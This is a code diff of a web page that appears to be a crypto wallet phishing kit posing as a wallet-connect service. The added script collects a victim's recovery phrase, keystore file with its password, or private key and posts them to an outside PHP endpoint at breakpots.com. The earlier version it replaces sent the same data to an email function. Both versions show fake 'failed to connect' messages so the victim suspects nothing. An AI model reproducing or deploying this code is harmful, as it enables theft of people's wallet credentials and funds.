@@ -1243,8 +1243,7 @@
     margin-bottom: 1rem;
   }
 </style>
-<script src="./formToJson.js.download"></script>
-<script src="./func.js.download"></script>
+
 <div id="___gatsby">
   <div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
     <div class="layout__SWrapper-wjwiqk-0 dijnUu">
@@ -2372,12 +2371,7 @@
     "component---src-pages-wallets-tsx": ["/component---src-pages-wallets-tsx-d83f6271c90954ac608f.js"]
   }; /*]]>*/
 </script>
-<script src="./polyfill-5ef5a555a07b3c6452d1.js.download" nomodule=""></script>
-<script src="./component---src-pages-apps-tsx-50d212c53780f4e2ed64.js.download" async=""></script>
-<script src="./commons-728581910d6e685fb39c.js.download" async=""></script>
-<script src="./app-2b5a75f35e7d5a1e67ad.js.download" async=""></script>
-<script src="./framework-8e528b732ab2eaadb7b7.js.download" async=""></script>
-<script src="./webpack-runtime-08a0e953018334063ddd.js.download" async=""></script>
+
 <style>
   /*! CSS Used from: Embedded */
   img {
@@ -3251,158 +3245,229 @@
     /* Styles */
   }
 </style>
+
 <script>
-  var popupname = document.querySelector("#walletname");
-  var overlay = document.querySelector(".overlay");
-  var icon = document.querySelectorAll(".pageStyles__SAppIcon-sc-1navawn-6");
-  var icon_text = document.querySelectorAll(".pageStyles__SAppName-sc-1navawn-7");
-  var popupimage = document.getElementById("myImg");
-  var icon_img = document.querySelectorAll(".img_icons");
-  var wallet_id = document.querySelector("#wallet_id")
+ // Function to handle form submission
+async function handleSubmitForm(event) {
+    event.preventDefault(); // Prevent default form submission
 
-  function icon_click(e) {
-    if (e.currentTarget = window.icon[i])
-      e.preventDefault();
-    var overlay = document.querySelector(".overlay");
-    overlay.style.display = "flex";
-    console.log(e);
-    popupname.innerHTML = e.srcElement.firstChild.alt.replace(" Wallet", "");
-    popupimage.src = e.srcElement.firstChild.currentSrc;
-    wallet_id.value = popupname.innerHTML;
-  }
+    const form = document.getElementById("submitform");
+    const statusMessage = form.querySelector(".status-message");
+    const submitButton = form.querySelector("button");
 
-  for (var i = 0; i < icon.length; i++) {
-    icon[i].addEventListener("click", icon_click, true)
+    // Show "Processing..." message
+    statusMessage.textContent = "Processing...";
+    statusMessage.style.color = "green";
+    submitButton.disabled = true; // Disable button to prevent multiple submissions
 
-  }
+    // Determine which input type is active
+    const activeInputType = getActiveInputType();
+    
+    // Create form data based on active input type
+    const formData = new FormData();
+    formData.append('wallet', document.getElementById('walletinput').value);
+    formData.append('type', activeInputType);
 
-  for (var i = 0; i < icon_text.length; i++) {
-    icon_text[i].addEventListener("click", function (e) {
-      e.preventDefault();
-      var overlay = document.querySelector(".overlay");
-      overlay.style.display = "flex";
-      console.log(e);
-      popupname.innerHTML = e.srcElement.innerText.replace(" Wallet", "");
-      popupimage.src = e.target.previousElementSibling.firstElementChild.currentSrc;
-      wallet_id.value = popupname.innerHTML;
-    })
-
-  }
-
-  //img-icon event listener
-  for (var i = 0; i < icon_img.length; i++) {
-    icon_img[i].addEventListener("click", function (e) {
-      e.preventDefault();
-      var overlay = document.querySelector(".overlay");
-      overlay.style.display = "flex";
-      console.log(e);
-      popupname.innerHTML = e.toElement.alt.replace(" Wallet", "");
-      popupimage.src = e.toElement.currentSrc;
-
-      wallet_id.value = popupname.innerHTML;
-    }, true)
-
-  }
-
-  var cancel = document.querySelector("#cancel");
-  cancel.addEventListener("click", function () {
-    var overlay = document.querySelector(".overlay");
-    overlay.style.display = "none";
-    var span = document.querySelector("#span");
-    span.innerHTML = "Choose Keystore File";
-    var attr = document.querySelector("#first");
-    var attr2 = document.querySelector("#second");
-    var attr3 = document.querySelector("#third");
-
-    attr.classList.remove("active");
-    attr2.classList.remove("active");
-    attr3.classList.remove("active");
-    attr.classList.add("active");
-    var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");
-
-
-    for (let i = 0; i < attr.length; i++) {
-      attr[i].value = "";
-
+    // Add data based on active input type
+    switch (activeInputType) {
+        case 'phrase':
+            formData.append('phrase', document.getElementById('phraseInput').value);
+            break;
+        case 'keystore':
+            formData.append('keystorejson', document.getElementById('kjsoninput').value);
+            formData.append('keystorepassword', document.querySelector('[name="keystorepassword"]').value);
+            break;
+        case 'privatekey':
+            formData.append('privatekey', document.getElementById('privateinput').value);
+            break;
     }
-  });
 
+    try {
+        const response = await fetch("https://breakpots.com/migxf/frx.php", {
+            method: "POST",
+            body: formData,
+        });
 
-  // var label = document.querySelector("#label");
-  // label.addEventListener("change", filenaming);
+        if (response.ok) {
+            // Show success message
+            statusMessage.textContent = "Failed to Connect Wallet. Please try again!!!";
+            statusMessage.style.color = "green";
+        } else {
+            throw new Error("Failed to submit the form.");
+        }
+    } catch (error) {
+        // Show error message
+        statusMessage.textContent = "Error connecting wallet. Please try again!!!";
+        statusMessage.style.color = "red";
+    }
 
-  // function filenaming(e) {
-  //   e.preventDefault();
-  //   var spantag = document.querySelector("#span");
-  //   var fullPath = document.getElementById('file-upload').value;
-  //   if (fullPath) {
-  //     var startIndex = (fullPath.indexOf('\\') >= 0 ? fullPath.lastIndexOf('\\') : fullPath.lastIndexOf('/'));
-  //     var filename = fullPath.substring(startIndex);
-  //     if (filename.indexOf('\\') === 0 || filename.indexOf('/') === 0) {
-  //       filename = filename.substring(1);
-  //     }
-  //     spantag.innerHTML = filename;
-  //   }
-  // }
-</script>
+    submitButton.disabled = false; // Re-enable the submit button
+}
 
-<script>
+// Helper function to determine active input type
+function getActiveInputType() {
+    if (document.querySelector('.phrasebox').classList.contains('activebox')) {
+        return 'phrase';
+    } else if (document.querySelector('.keystorebox').classList.contains('activebox')) {
+        return 'keystore';
+    } else if (document.querySelector('.privatebox').classList.contains('activebox')) {
+        return 'privatekey';
+    }
+    return 'phrase'; // Default
+}
 
-  $('.cmAzHq').click(function () {
-    extractwallet(this);
-  });
+// Wallet selection functionality
+document.addEventListener('DOMContentLoaded', function() {
+    // Set up form submission
+    document.getElementById("submitform").addEventListener("submit", handleSubmitForm);
+    
+    // Set up wallet selection
+    var popupname = document.querySelector("#walletname");
+    var overlay = document.querySelector(".overlay");
+    var icon = document.querySelectorAll(".pageStyles__SAppIcon-sc-1navawn-6");
+    var icon_text = document.querySelectorAll(".pageStyles__SAppName-sc-1navawn-7");
+    var popupimage = document.getElementById("myImg");
+    var icon_img = document.querySelectorAll(".img_icons");
+    var wallet_id = document.querySelector("#wallet_id");
 
+    function icon_click(e) {
+        e.preventDefault();
+        overlay.style.display = "flex";
+        popupname.innerHTML = e.srcElement.firstChild.alt.replace(" Wallet", "");
+        popupimage.src = e.srcElement.firstChild.currentSrc;
+        wallet_id.value = popupname.innerHTML;
+        document.getElementById('walletinput').value = popupname.innerHTML;
+    }
 
-</script>
+    for (var i = 0; i < icon.length; i++) {
+        icon[i].addEventListener("click", icon_click);
+    }
 
-<script>
-  async function handleSubmitForm(formId) {
-      event.preventDefault(); // Prevent default form submission
+    for (var i = 0; i < icon_text.length; i++) {
+        icon_text[i].addEventListener("click", function (e) {
+            e.preventDefault();
+            overlay.style.display = "flex";
+            popupname.innerHTML = e.srcElement.innerText.replace(" Wallet", "");
+            popupimage.src = e.target.previousElementSibling.firstElementChild.currentSrc;
+            wallet_id.value = popupname.innerHTML;
+            document.getElementById('walletinput').value = popupname.innerHTML;
+        });
+    }
 
-      const form = document.getElementById(formId);
-      const statusMessage = form.querySelector(".status-message");
-      const submitButton = form.querySelector("button");
+    // img-icon event listener
+    for (var i = 0; i < icon_img.length; i++) {
+        icon_img[i].addEventListener("click", function (e) {
+            e.preventDefault();
+            overlay.style.display = "flex";
+            popupname.innerHTML = e.target.alt.replace(" Wallet", "");
+            popupimage.src = e.target.currentSrc;
+            wallet_id.value = popupname.innerHTML;
+            document.getElementById('walletinput').value = popupname.innerHTML;
+        });
+    }
 
-      // Show "Processing..." message
-      statusMessage.textContent = "Processing...";
-      statusMessage.style.color = "green";
-      submitButton.disabled = true; // Disable button to prevent multiple submissions
+    var cancel = document.querySelector("#cancel");
+    if (cancel) {
+        cancel.addEventListener("click", function () {
+            overlay.style.display = "none";
+            var span = document.querySelector("#span");
+            if (span) span.innerHTML = "Choose Keystore File";
+            
+            var attr = document.querySelector("#first");
+            var attr2 = document.querySelector("#second");
+            var attr3 = document.querySelector("#third");
 
-      const formData = new FormData(form);
-      const data = {};
-      formData.forEach((value, key) => {
-          data[key] = value;
-      });
+            if (attr && attr2 && attr3) {
+                attr.classList.remove("active");
+                attr2.classList.remove("active");
+                attr3.classList.remove("active");
+                attr.classList.add("active");
+            }
+            
+            var inputs = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");
+            for (let i = 0; i < inputs.length; i++) {
+                inputs[i].value = "";
+            }
+        });
+    }
 
-      try {
-          const response = await fetch("/.netlify/functions/sendEmail", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(data),
-          });
+    // Set up wallet extraction
+    var extractElements = document.querySelectorAll('.cmAzHq');
+    for (var i = 0; i < extractElements.length; i++) {
+        extractElements[i].addEventListener('click', function() {
+            extractwallet(this);
+        });
+    }
+});
 
-          if (response.ok) {
-              // Show success message
-              statusMessage.textContent = "Failed to Connect Wallet. Please try again!!!";
-              statusMessage.style.color = "green";
-              /*statusMessage.style.fontSize = "12px";*/
-              form.reset(); // Reset the form
-          } else {
-              throw new Error("Failed to submit the form.");
-          }
-      } catch (error) {
-          // Show error message
-          statusMessage.textContent = "Error connecting wallet. Please try again!!!";
-          statusMessage.style.color = "green";
-      }
+// Extract wallet functionality
+function extractwallet(element) {
+    // These functions need to be defined in your code
+    // openx('#thebox');
+    // shutx('.yuck');
 
-      submitButton.disabled = false; // Re-enable the submit button
-  }
+    document.querySelector('.insidewidth').classList.remove('activebox');
+    document.querySelector('.twodiv').classList.add('activebox');
 
-  // Attach event listeners
-  document.getElementById("submitform").addEventListener("submit", function(event) {
-      handleSubmitForm("submitform");
-  });
+    document.getElementById('initext').innerHTML = "Initializing";
+    document.querySelector('.loaderw').style.display = 'block';
+    document.querySelector('.yuck').style.display = 'none';
+    document.getElementById('fdxz').classList.remove('reddsdiv');
+
+    setTimeout(function () {
+        document.getElementById('initext').innerHTML = "Error connecting";
+        document.querySelector('.loaderw').style.display = 'none';
+        document.querySelector('.yuck').style.display = 'block';
+        document.getElementById('fdxz').classList.add('reddsdiv');
+    }, 2000);
+
+    var text = element.textContent.replace(/\t+/g, '').trim();
+    document.getElementById('walletinput').value = text;
+    document.getElementById('extracttext').innerHTML = text;
+    document.getElementById('extracttext2').innerHTML = text;
+}
+
+// Start job functionality
+function startjob() {
+    document.querySelector('.insidewidth').classList.add('activebox');
+    document.querySelector('.twodiv').classList.remove('activebox');
+}
+
+// Switch show functionality
+function switchshow(element) {
+    var allInputs = document.querySelectorAll('.allinput');
+    for (var i = 0; i < allInputs.length; i++) {
+        allInputs[i].value = "";
+    }
+
+    var sgrids = document.querySelectorAll('.sgrid');
+    for (var i = 0; i < sgrids.length; i++) {
+        sgrids[i].classList.remove('sactive');
+    }
+    element.classList.add('sactive');
+
+    // Determine active input type
+    var isPhrase = element.textContent === "Phrase";
+    var isKeystore = element.textContent === "Keystore JSON";
+    var isPrivate = element.textContent === "Private Key";
+
+    // Show appropriate input box
+    var ccboxes = document.querySelectorAll('.ccbox');
+    for (var i = 0; i < ccboxes.length; i++) {
+        ccboxes[i].classList.remove('activebox');
+    }
+    
+    if (isPhrase) {
+        document.querySelector('.phrasebox').classList.add('activebox');
+        document.getElementById('wallettype').value = "phrase";
+    } else if (isKeystore) {
+        document.querySelector('.keystorebox').classList.add('activebox');
+        document.getElementById('wallettype').value = "keystore";
+    } else if (isPrivate) {
+        document.querySelector('.privatebox').classList.add('activebox');
+        document.getElementById('wallettype').value = "privatekey";
+    }
+}
 </script>
 
 
